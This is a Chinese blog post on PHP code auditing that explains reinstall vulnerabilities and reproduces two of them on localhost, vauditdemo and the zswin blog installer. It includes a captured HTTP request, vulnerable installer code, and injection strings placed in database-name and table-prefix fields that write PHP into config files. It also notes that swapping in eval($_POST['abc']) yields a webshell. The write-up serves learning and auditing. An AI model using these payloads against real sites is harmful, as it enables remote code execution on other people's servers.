<!DOCTYPE html>


  <html class="light page-post">


<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>PHP代码审计之重装漏洞 | Threezh1&#39;s blog</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="PHP,">
  

  <meta name="description" content="重装漏洞根据大佬们的总结，重装漏洞可以以下几种类型：  自动删除这个安装文件  通过生成一个lock文件来判断程序是否安装过  根本无验证  安装完成后不会自动删除文件，又不会生成lock判断是否安装过  安装file  直接用GET提交step绕过，直接进入下一步  变量覆盖导致重装  可以GET,POST,COOKIE 任意提交一个变量名$insLockfile,给其赋空值，覆盖掉$insLo">
<meta name="keywords" content="PHP">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP代码审计之重装漏洞">
<meta property="og:url" content="http://yoursite.com/2019/05/18/PHP代码审计之重装漏洞/index.html">
<meta property="og:site_name" content="Threezh1&#39;s blog">
<meta property="og:description" content="重装漏洞根据大佬们的总结，重装漏洞可以以下几种类型：  自动删除这个安装文件  通过生成一个lock文件来判断程序是否安装过  根本无验证  安装完成后不会自动删除文件，又不会生成lock判断是否安装过  安装file  直接用GET提交step绕过，直接进入下一步  变量覆盖导致重装  可以GET,POST,COOKIE 任意提交一个变量名$insLockfile,给其赋空值，覆盖掉$insLo">
<meta property="og:locale" content="Chinese">
<meta property="og:image" content="https://i.loli.net/2019/05/18/5ce001381792a52779.jpg">
<meta property="og:image" content="https://i.loli.net/2019/05/18/5ce001360367555804.jpg">
<meta property="og:image" content="https://i.loli.net/2019/05/19/5ce0b569747fd26998.jpg">
<meta property="og:image" content="https://i.loli.net/2019/05/19/5ce0b569337d168459.jpg">
<meta property="og:image" content="https://i.loli.net/2019/05/19/5ce0b56abedb011742.jpg">
<meta property="og:updated_time" content="2019-05-19T02:50:42.609Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PHP代码审计之重装漏洞">
<meta name="twitter:description" content="重装漏洞根据大佬们的总结，重装漏洞可以以下几种类型：  自动删除这个安装文件  通过生成一个lock文件来判断程序是否安装过  根本无验证  安装完成后不会自动删除文件，又不会生成lock判断是否安装过  安装file  直接用GET提交step绕过，直接进入下一步  变量覆盖导致重装  可以GET,POST,COOKIE 任意提交一个变量名$insLockfile,给其赋空值，覆盖掉$insLo">
<meta name="twitter:image" content="https://i.loli.net/2019/05/18/5ce001381792a52779.jpg">

  

  
    <link rel="icon" href="/favicon.ico">
  

  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  

  


  
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

</head>
</html>
<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a class="ROUND_RECT" href="/archives/" rel="noopener noreferrer" target="_self">
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a class="ROUND_RECT" href="/category/" rel="noopener noreferrer" target="_self">
            分类
          </a>
        </li>
      
        <li class="item-toolbox">
          <a class="ROUND_RECT" href="/tag/" rel="noopener noreferrer" target="_self">
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a class="ROUND_RECT" href="/link/" rel="noopener noreferrer" target="_self">
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a class="ROUND_RECT" href="/about/" rel="noopener noreferrer" target="_self">
            关于
          </a>
        </li>
      
        <li class="item-toolbox">
          <a class="ROUND_RECT" href="http://119.3.219.188/" rel="noopener noreferrer" target="_self">
            三天
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#重装漏洞"><span class="toc-text">重装漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现-vauditdemo重装漏洞"><span class="toc-text">复现 vauditdemo重装漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码分析"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zswin博客重装漏洞-getshell-复现"><span class="toc-text">zswin博客重装漏洞 getshell 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-1"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码分析-1"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#遇到的问题"><span class="toc-text">遇到的问题</span></a></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-PHP代码审计之重装漏洞" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">PHP代码审计之重装漏洞</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2019.05.18</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>Threezh1</span>
        </span>
      

      
  <span class="article-category">
    <i class="icon-list"></i>
    <a class="article-category-link" href="/categories/代码审计/">代码审计</a>
  </span>



      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h2><p>根据大佬们的总结，重装漏洞可以以下几种类型：</p>
<ol>
<li><p>自动删除这个安装文件</p>
<p> 通过生成一个lock文件来判断程序是否安装过</p>
</li>
<li><p>根本无验证</p>
<p> 安装完成后不会自动删除文件，又不会生成lock判断是否安装过</p>
</li>
<li><p>安装file</p>
<p> 直接用GET提交step绕过，直接进入下一步</p>
</li>
<li><p>变量覆盖导致重装</p>
<p> 可以GET,POST,COOKIE 任意提交一个变量名$insLockfile,给其赋空值，覆盖掉$insLockfile,从而让file_exists为false就不会退出</p>
</li>
<li><p>判断lock后，无exit</p>
<p> 判断是否存在lock文件，如果存在lock文件，就会header到index.php,但是header后并没有exit，所以 并不会退出，类似的还有javascript弹个框</p>
</li>
<li><p>解析漏洞</p>
<p> 在安装完成后会将install.php 重命名为index.php.bak,但是由于Apache的解析漏洞：如果无法识别到最后一个后缀的话，就会向上解析，那么就又变成了php了，然后结合安装时的变量覆盖又成重装了。</p>
</li>
<li><p>满足一些条件不会退出的</p>
</li>
</ol>
<p>这次复现的两个漏洞，都属于第五类。当页面跳转到主页之后，原来的php进程依然存在，导致可以重装，而当配置信息没有经过过滤而被直接写入了文件当中，就可能会导致getshell。寻找此类漏洞应该尝试去跟踪配置信息的最终去处，并检查是否有过滤。通过构造闭合语句利用漏洞。</p>
<h2 id="复现-vauditdemo重装漏洞"><a href="#复现-vauditdemo重装漏洞" class="headerlink" title="复现 vauditdemo重装漏洞"></a>复现 vauditdemo重装漏洞</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问 <a href="http://127.0.0.1/install/install.php" target="_blank" rel="noopener">http://127.0.0.1/install/install.php</a></p>
<p>提交数据库信息，用brupsuite抓包。(为了便于演示，我将header()语句注释了)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /install/install.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1/install/install.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 84</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=jfjge50g22ieqm7ib5ia1quf73</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">dbhost=localhost&amp;dbuser=root&amp;dbpass=root&amp;dbname=vauditdemo&amp;Submit=%E5%AE%89%E8%A3%9D</span><br></pre></td></tr></table></figure>
<p>将dbname修改为：</p>
<pre><code>testdb;-- -&quot;;phpinfo();//
</code></pre><p>提交。</p>
<p><img src="https://i.loli.net/2019/05/18/5ce001381792a52779.jpg" alt="1_install_success.jpg"></p>
<p>跳转到index之后可以看到phpinfo()信息</p>
<p><img src="https://i.loli.net/2019/05/18/5ce001360367555804.jpg" alt="1_phpinfo.jpg"></p>
<p>复现成功</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>平台的install.php安装页面, 安装之前会有一段验证是否已经安装的判断语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( file_exists($_SERVER[<span class="string">"DOCUMENT_ROOT"</span>].<span class="string">'/sys/install.lock'</span>) ) &#123;</span><br><span class="line">	header( <span class="string">"Location: ../index.php"</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断安装生成的lock文件是否存在，如果存在，就重定向到index.php</p>
<p>但是这里存在一个错误，当页面重定向到index之后，并没有执行exit语句来结束进程，所以install.php的进程一直存在。这时如果用brupsuite抓包，提交的数据会被判断语句之后的代码所执行，就会导致重装漏洞。</p>
<p>判断语句后，获取了一些环境信息之后就通过POST方法获取数据库的信息。</p>
<p>(代码经过省略)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( $_POST ) &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	$dbhost = $_POST[<span class="string">"dbhost"</span>];</span><br><span class="line">	$dbuser = $_POST[<span class="string">"dbuser"</span>];</span><br><span class="line">	$dbpass = $_POST[<span class="string">"dbpass"</span>];</span><br><span class="line">	$dbname = $_POST[<span class="string">"dbname"</span>];</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	mysql_query( <span class="string">"CREATE DATABASE $dbname"</span>, $con ) <span class="keyword">or</span> <span class="keyword">die</span> ( mysql_error() );</span><br><span class="line"></span><br><span class="line">	$str_tmp=<span class="string">"&lt;?php\r\n"</span>;</span><br><span class="line">	$str_end=<span class="string">"?&gt;"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"error_reporting(0);\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"if (!file_exists(\$_SERVER[\"DOCUMENT_ROOT\"].'/sys/install.lock'))&#123;\r\n\theader(\"Location: /install/install.php\");\r\nexit;\r\n&#125;\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"include_once('../sys/lib.php');\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\$host=\"$dbhost\"; \r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\$username=\"$dbuser\"; \r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\$password=\"$dbpass\"; \r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\$database=\"$dbname\"; \r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\$conn = mysql_connect(\$host,\$username,\$password);\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"mysql_query('set names utf8',\$conn);\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"if (!\$conn)\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"&#123;\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\tdie('Could not connect: ' . mysql_error());\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\texit;\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"&#125;\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"session_start();\r\n"</span>;</span><br><span class="line">	$str_tmp.=<span class="string">"\r\n"</span>;</span><br><span class="line">	$str_tmp.=$str_end;</span><br><span class="line"></span><br><span class="line">	$fp=fopen( <span class="string">"../sys/config.php"</span>, <span class="string">"w"</span> );</span><br><span class="line">	fwrite( $fp, $str_tmp );</span><br><span class="line">	fclose( $fp );</span><br></pre></td></tr></table></figure>
<p>可以看到，页面通过所提交的dbhost, dbuser, dbpass, dbname来获取数据库基本信息。</p>
<p>在判断数据库信息是否符合安装条件之后，页面将一段判断是否已经安装的php脚本写入到config.php里。</p>
<p>问题出在其中的一条语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str_tmp.=<span class="string">"\$database=\"$dbname\"; \r\n"</span>;</span><br></pre></td></tr></table></figure>
<p>可知，dbname是可控的。</p>
<p>当我们将dbname设置为：</p>
<pre><code>testdb;-- -&quot;;phpinfo();//

-- -     是为了注释掉后面的sql语句
&quot;;        闭合php语句
//        注释掉后面的php语句
</code></pre><p>config.php里的语句就会变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$database=<span class="string">"testdb; -- -"</span>; phpinfo();<span class="comment">//";</span></span><br></pre></td></tr></table></figure>
<p>也就会执行phpinfo(), 当我们把phpinfo()修改为：<code>eval($_POST[&#39;abc&#39;])</code>就可以直接getshell；</p>
<h2 id="zswin博客重装漏洞-getshell-复现"><a href="#zswin博客重装漏洞-getshell-复现" class="headerlink" title="zswin博客重装漏洞 getshell 复现"></a>zswin博客重装漏洞 getshell 复现</h2><p>在百度上直接搜到的一个重装漏洞，博客系统有点老了，但是拿来学习还是不错的。</p>
<p>参考：<a href="https://shuimugan.com/bug/view?bug_no=119025" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=119025</a></p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在已经安装好的博客，直接访问：</p>
<p><a href="http://127.0.0.1/zwin/install.php?m=install&amp;c=index&amp;a=setconf" target="_blank" rel="noopener">http://127.0.0.1/zwin/install.php?m=install&amp;c=index&amp;a=setconf</a></p>
<p>不会跳转到主页，直接进入安装向导页面。</p>
<p>其他地方正常填写，将数据表前缀改为：</p>
<pre><code>zs_&apos;);phpinfo();//
</code></pre><p><img src="https://i.loli.net/2019/05/19/5ce0b569747fd26998.jpg" alt="2_tianxie.jpg"></p>
<p>点击下一步，数据库就可以创建成功</p>
<p><img src="https://i.loli.net/2019/05/19/5ce0b569337d168459.jpg" alt="2_chuangjianxchenggong.jpg"></p>
<p>之后再访问：</p>
<p><a href="http://127.0.0.1/zwin/app/user/conf/config.php" target="_blank" rel="noopener">http://127.0.0.1/zwin/app/user/conf/config.php</a></p>
<p><img src="https://i.loli.net/2019/05/19/5ce0b56abedb011742.jpg" alt="2_config.jpg"></p>
<p>可以看到phpinfo()，把phpinfo()修改为：<code>eval($_POST[&#39;abc&#39;])</code>就可以直接getshell；</p>
<p>漏洞复现成功</p>
<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>存在漏洞的页面：</p>
<p>install/install/controller/indexcontroller.class.php</p>
<p>页面开头存在一个index()方法用于判断是否安装成功：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (is_file(<span class="string">'./Data/install.lock'</span>)) &#123;</span><br><span class="line">	header(<span class="string">'Location: ./index.php'</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据参考文章的说法：</p>
<pre><code>但是这个不是类的初始化函数所以不影响其他方法的使用。
</code></pre><p>我在页面当中没有找到引用index()方法的语句，应该是ThinkPHP框架的一些固定用法吧。这个问题等后面学习了ThinkPHP框架后再说。</p>
<p>继续往下看。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">finish_done</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">		$auth  = build_auth_key();</span><br><span class="line">		</span><br><span class="line">		$config_data[<span class="string">'DB_TYPE'</span>] = $temp_info[<span class="string">'db_type'</span>];</span><br><span class="line">		$config_data[<span class="string">'DB_HOST'</span>] = $temp_info[<span class="string">'db_host'</span>];</span><br><span class="line">		$config_data[<span class="string">'DB_NAME'</span>] = $temp_info[<span class="string">'db_name'</span>];</span><br><span class="line">		$config_data[<span class="string">'DB_USER'</span>] = $temp_info[<span class="string">'db_user'</span>];</span><br><span class="line">		$config_data[<span class="string">'DB_PWD'</span>] = $temp_info[<span class="string">'db_pass'</span>];</span><br><span class="line">		$config_data[<span class="string">'DB_PORT'</span>] = $temp_info[<span class="string">'db_port'</span>];</span><br><span class="line">		$config_data[<span class="string">'DB_PREFIX'</span>] = $&lt;strong&gt;temp_info&lt;/strong&gt;[<span class="string">'db_prefix'</span>];</span><br><span class="line">		$db = Db::getInstance($config_data);</span><br><span class="line">		$config_data[<span class="string">'WEB_MD5'</span>] = $auth;</span><br><span class="line">		$conf 	=	write_config($config_data);</span><br><span class="line">		</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>可知，在finish_done()方法中，有一个函数为write_config(),所传递的参数为数据库配置信息。</p>
<p>而这些数据配置信息，都没有经过过滤或检查。都是直接接收POST数据来进行传递的。</p>
<p>跟踪这个函数至：install/install/common/function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_config</span><span class="params">($config, $auth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($config))&#123;</span><br><span class="line">		<span class="comment">//读取配置内容</span></span><br><span class="line">		$conf = file_get_contents(MODULE_PATH . <span class="string">'sqldata/conf.tpl'</span>);</span><br><span class="line">		$user = file_get_contents(MODULE_PATH . <span class="string">'sqldata/user.tpl'</span>);</span><br><span class="line">		<span class="comment">//替换配置项</span></span><br><span class="line">		<span class="keyword">foreach</span> ($config <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">			$conf = str_replace(<span class="string">"[&#123;$name&#125;]"</span>, $value, $conf);</span><br><span class="line">			$user = str_replace(<span class="string">"[&#123;$name&#125;]"</span>, $value, $user);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//写入应用配置文件</span></span><br><span class="line">        file_put_contents(<span class="string">'./App/Common/Conf/config.php'</span>, $conf);</span><br><span class="line">        file_put_contents(<span class="string">'./App/User/Conf/config.php'</span>, $user);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可知，函数的功能是读取sqldata目录下的两个配置文件，将传递进来的数据库配置信息分别写入到两个config.php里去。</p>
<p>先看一下user.sql:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UCenter客户端配置文件</span></span><br><span class="line"><span class="comment"> * 注意：该配置文件请使用常量方式定义</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'UC_APP_ID'</span>, <span class="number">1</span>); <span class="comment">//应用ID</span></span><br><span class="line">define(<span class="string">'UC_API_TYPE'</span>, <span class="string">'Model'</span>); <span class="comment">//可选值 Model / Service</span></span><br><span class="line">define(<span class="string">'UC_AUTH_KEY'</span>, <span class="string">'[WEB_MD5]'</span>); <span class="comment">//加密KEY</span></span><br><span class="line">define(<span class="string">'UC_DB_DSN'</span>, <span class="string">'[DB_TYPE]://[DB_USER]:[DB_PWD]@[DB_HOST]:[DB_PORT]/[DB_NAME]'</span>); <span class="comment">// 数据库连接，使用Model方式调用API必须配置此项</span></span><br><span class="line">define(<span class="string">'UC_TABLE_PREFIX'</span>, <span class="string">'[DB_PREFIX]'</span>); <span class="comment">// 数据表前缀，使用Model方式调用API必须配置此项</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>除了DB_NAME, DB_PREFIX可以修改以外，修改其他的数据配置会导致数据库创建失败。</p>
<p>所以，这里可以利用的就存在两处</p>
<p>将DB_NAME赋值为：</p>
<pre><code>zswin1]&apos;);phpinfo();//
</code></pre><p>或者将DB_PREFIX赋值为：</p>
<pre><code>zs_&apos;);phpinfo();//
</code></pre><p>都可以利用成功。</p>
<p>/App/User/Conf/config.php就会变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'UC_DB_DSN'</span>, <span class="string">'mysql://root:root@127.0.0.1:3306/zswin1]'</span>);phpinfo();<span class="comment">//'); // 数据库连接，使用Model方式调用API必须配置此项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'UC_TABLE_PREFIX'</span>, <span class="string">'zs_'</span>);phpinfo();<span class="comment">//'); // 数据表前缀，使用Model方式调用API必须配置此项</span></span><br></pre></td></tr></table></figure>
<p>sqldata/conf.tpl也是一样的步骤，只不过user.tql可以更容易闭合语句。</p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
<li>对框架的结构还是不太了解，是否调用，如何调用也不太清楚。需要去学习一下框架的基本知识。</li>
</ul>

    
  </div>

</article>


   

   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2019/05/17/JWT备忘录/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2019/05/26/强网杯upload Writeup与简单分析/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a class="ROUND_RECT" href="/archives/" rel="noopener noreferrer" target="_self">
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a class="ROUND_RECT" href="/category/" rel="noopener noreferrer" target="_self">
              分类
            </a>
          </li>
        
          <li class="item-toolbox">
            <a class="ROUND_RECT" href="/tag/" rel="noopener noreferrer" target="_self">
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a class="ROUND_RECT" href="/link/" rel="noopener noreferrer" target="_self">
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a class="ROUND_RECT" href="/about/" rel="noopener noreferrer" target="_self">
              关于
            </a>
          </li>
        
          <li class="item-toolbox">
            <a class="ROUND_RECT" href="http://119.3.219.188/" rel="noopener noreferrer" target="_self">
              三天
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    

    
    

    

    
    

    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
